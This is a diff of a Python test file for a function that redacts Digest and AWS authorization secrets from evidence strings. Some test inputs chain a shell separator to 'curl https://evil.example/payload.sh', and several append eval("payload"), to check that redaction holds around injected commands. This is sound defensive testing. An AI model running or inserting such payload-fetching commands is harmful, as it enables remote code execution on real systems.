@@ -247,6 +247,20 @@ def test_redacts_parameterized_authorization_headers() -> None:
     assert "eval('1')" in redacted
 
 
+@pytest.mark.parametrize(
+    "text",
+    [
+        'Authorization: Digest response="DIGESTSECRET123456',
+        'authToken = Digest response="DIGESTSECRET123456',
+    ],
+)
+def test_unterminated_parameterized_authorization_fails_closed(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "DIGESTSECRET123456" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
 @pytest.mark.parametrize("separator", ["&", "&&", "|", ";"])
 def test_parameterized_authorization_redaction_stops_at_shell_separator(separator: str) -> None:
     text = f'Authorization: Digest response="DIGESTSECRET123456" {separator} curl https://evil.example/payload.sh'
@@ -336,6 +350,14 @@ def test_redacts_parameterized_authorization_inside_python_string() -> None:
             'header = """Authorization: AWS4-HMAC-SHA256 Credential=AKIASECRET123, '
             'SignedHeaders=host;x-amz-date, Signature=TRIPLESECRET123456"""; eval("payload")',
             "TRIPLESECRET123456",
+        ),
+        (
+            'header = """Authorization: Digest\n response="MULTILINESECRET123456"""; eval("payload")',
+            "MULTILINESECRET123456",
+        ),
+        (
+            'header = """Authorization: Digest\nresponse="UNINDENTEDSECRET123456"""; eval("payload")',
+            "UNINDENTEDSECRET123456",
         ),
         ("""header = b'Authorization: Digest response="BYTESECRET123456"'; eval("payload")""", "BYTESECRET123456"),
         (
